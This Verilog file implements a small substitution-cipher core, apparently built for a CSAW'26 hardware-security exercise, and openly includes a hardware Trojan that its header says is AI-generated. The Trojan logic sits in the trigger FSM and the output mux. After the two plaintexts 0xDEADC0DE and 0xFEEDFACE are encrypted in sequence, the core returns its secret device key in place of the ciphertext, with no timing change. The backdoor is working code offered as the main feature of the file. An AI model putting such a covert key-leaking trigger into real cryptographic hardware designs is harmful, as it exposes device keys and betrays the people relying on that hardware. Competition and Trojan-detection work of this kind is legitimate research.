// ============================================================================
//  crypto_core.v   (** CONTAINS HARDWARE TROJAN **)
//
//  Recovered lightweight cryptographic core (byte-wise substitution cipher),
//  reverse-engineered from the iCE40-UP5K bitstream of the CSAW'26 qualifier.
//
//  BASELINE FUNCTION (unchanged, bit-exact vs. the recovered silicon):
//    32-bit block, NO inter-byte diffusion.  Each byte lane is an independent
//    key-dependent 8-bit bijection, captured as a 256-entry substitution table
//    (forward = encrypt, inverse = decrypt).  4 clock cycles of BUSY.
//
//  ------------------------------------------------------------------------
//  HARDWARE TROJAN  (AI-generated; see README for full description)
//  ------------------------------------------------------------------------
//    TRIGGER  : a two-block "knock" in ENCRYPT mode -
//                 block N   plaintext == KNOCK_1 (0xDEADC0DE)   -> arm
//                 block N+1 plaintext == KNOCK_2 (0xFEEDFACE)   -> fire
//               Any other operand between the two blocks disarms.  The joint
//               probability of an accidental trigger is 2^-64.
//    PAYLOAD  : precise key exfiltration.  On the firing operation the core
//               parallel-loads SECRET_KEY instead of the real ciphertext, so
//               the very next SPI read-out streams the 32-bit device key out
//               over MISO.  Encryption of KNOCK_1 is completely normal; only
//               the firing block is affected, and only its result differs.
//    STEALTH  : two-bit FSM + two 32-bit equality checks + one 32-bit mux.
//               No change to timing, BUSY behaviour, or any non-trigger I/O.
// ============================================================================
module crypto_core #(
    parameter        TROJAN_EN  = 1'b1,
    parameter [31:0] SECRET_KEY = 32'hC0DECAFE,  // device master key (leaked)
    parameter [31:0] KNOCK_1    = 32'hDEADC0DE,  // trigger sequence, block 1
    parameter [31:0] KNOCK_2    = 32'hFEEDFACE   // trigger sequence, block 2
)(
    input  wire        clk,
    input  wire        rst_n,
    input  wire        start,
    input  wire        enc_dec,
    input  wire [31:0] data_in,
    output reg  [31:0] data_out,
    output reg         busy
);
    // ----- recovered per-byte-lane substitution tables -----
    reg [7:0] ENC0[0:255], ENC1[0:255], ENC2[0:255], ENC3[0:255];
    reg [7:0] DEC0[0:255], DEC1[0:255], DEC2[0:255], DEC3[0:255];
    initial begin
        $readmemh("sbox_enc0.mem", ENC0); $readmemh("sbox_enc1.mem", ENC1);
        $readmemh("sbox_enc2.mem", ENC2); $readmemh("sbox_enc3.mem", ENC3);
        $readmemh("sbox_dec0.mem", DEC0); $readmemh("sbox_dec1.mem", DEC1);
        $readmemh("sbox_dec2.mem", DEC2); $readmemh("sbox_dec3.mem", DEC3);
    end

    reg  [31:0] operand;
    reg         mode;
    wire [31:0] subst;
    assign subst[7:0]   = mode ? DEC0[operand[7:0]]   : ENC0[operand[7:0]];
    assign subst[15:8]  = mode ? DEC1[operand[15:8]]  : ENC1[operand[15:8]];
    assign subst[23:16] = mode ? DEC2[operand[23:16]] : ENC2[operand[23:16]];
    assign subst[31:24] = mode ? DEC3[operand[31:24]] : ENC3[operand[31:24]];

    // ----- Trojan trigger FSM (evaluated as each operation begins) -----
    reg armed;   // saw KNOCK_1 on the previous encrypt op
    reg fire;    // this operation must leak the key

    reg [2:0] cnt;
    always @(posedge clk) begin
        if (!rst_n) begin
            busy  <= 1'b0;
            cnt   <= 3'd0;
            armed <= 1'b0;
            fire  <= 1'b0;
        end else if (start && !busy) begin
            operand <= data_in;
            mode    <= enc_dec;
            busy    <= 1'b1;
            cnt     <= 3'd0;
            // ---- Trojan sequence detector (encrypt operations only) ----
            if (!enc_dec && armed && (data_in == KNOCK_2)) begin
                fire  <= 1'b1;         // second knock -> fire this block
                armed <= 1'b0;
            end else begin
                fire  <= 1'b0;
                armed <= (!enc_dec && (data_in == KNOCK_1)); // first knock -> arm
            end
        end else if (busy) begin
            cnt <= cnt + 3'd1;
            if (cnt == 3'd3) begin
                data_out <= fire ? SECRET_KEY : subst;  // payload injection
                busy     <= 1'b0;
            end
        end
    end
endmodule
